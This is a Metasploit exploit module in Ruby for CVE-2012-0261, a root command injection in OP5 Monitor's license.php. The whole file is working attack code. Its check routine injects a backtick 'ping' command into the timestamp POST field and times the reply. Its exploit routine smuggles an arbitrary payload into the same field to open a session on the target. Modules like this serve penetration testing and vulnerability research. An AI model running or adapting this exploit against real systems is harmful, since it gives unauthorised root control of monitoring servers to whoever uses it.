# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;        => &#039;OP5 license.php Remote Command Execution&#039;,
      &#039;Description&#039; => %q{
        This module exploits an arbitrary root command execution vulnerability in the
        OP5 Monitor license.php. Ekelow has confirmed that OP5 Monitor versions 5.3.5,
        5.4.0, 5.4.2, 5.5.0, 5.5.1 are vulnerable.
      },
      &#039;Author&#039;     => [ &#039;Peter Osterberg <j[at]vel.nu>&#039; ],
      &#039;License&#039;    => MSF_LICENSE,
      &#039;References&#039; =>
        [
          [&#039;CVE&#039;, &#039;2012-0261&#039;],
          [&#039;OSVDB&#039;, &#039;78064&#039;],
          [&#039;URL&#039;, &#039;http://secunia.com/advisories/47417/&#039;],
        ],
      &#039;Privileged&#039; => true,
      &#039;Payload&#039;    =>
        {
          &#039;DisableNops&#039; => true,
          &#039;Space&#039;       => 1024,
          &#039;BadChars&#039;    => &#039;`\\|&#039;,
          &#039;Compat&#039;      =>
            {
              &#039;PayloadType&#039; => &#039;cmd&#039;,
              &#039;RequiredCmd&#039; => &#039;perl ruby python&#039;,
            }
        },
      &#039;Platform&#039;       => &#039;unix&#039;,
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Targets&#039;        => [[ &#039;Automatic&#039;, { }]],
      &#039;DisclosureDate&#039; => &#039;Jan 05 2012&#039;,
      &#039;DefaultTarget&#039;  => 0))
 
      register_options(
        [
          Opt::RPORT(443),
          OptString.new(&#039;URI&#039;, [true, "The full URI path to license.php", "/license.php"]),
        ], self.class)
  end
 
  def check
    vprint_status("Attempting to detect if the OP5 Monitor is vulnerable...")
    vprint_status("Sending request to https://#{rhost}:#{rport}#{datastore[&#039;URI&#039;]}")
 
    # Try running/timing &#039;ping localhost&#039; to determine is system is vulnerable
    start = Time.now
 
    data = &#039;timestamp=1317050333`ping -c 10 127.0.0.1`&action=install&install=Install&#039;;
    res = send_request_cgi({
      &#039;uri&#039;     => normalize_uri(datastore[&#039;URI&#039;]),
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;proto&#039;   => &#039;HTTPS&#039;,
      &#039;data&#039;    => data,
      &#039;headers&#039; =>
      {
        &#039;Connection&#039;     => &#039;close&#039;,
      }
    }, 25)
    elapsed = Time.now - start
    if elapsed >= 5
      return Exploit::CheckCode::Vulnerable
    end
    return Exploit::CheckCode::Safe
  end
 
  def exploit
    print_status("Sending request to https://#{rhost}:#{rport}#{datastore[&#039;URI&#039;]}")
 
    data = &#039;timestamp=1317050333`&#039; + payload.encoded + &#039;`&action=install&install=Install&#039;;
 
    res = send_request_cgi({
      &#039;uri&#039;     => normalize_uri(datastore[&#039;URI&#039;]),
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;proto&#039;   => &#039;HTTPS&#039;,
      &#039;data&#039;    => data,
      &#039;headers&#039; =>
      {
        &#039;Connection&#039;     => &#039;close&#039;,
      }
    }, 25)
 
    if(not res)
      if session_created?
        print_status("Session created, enjoy!")
      else
        print_error("No response from the server")
      end
      return
    end
  end
end

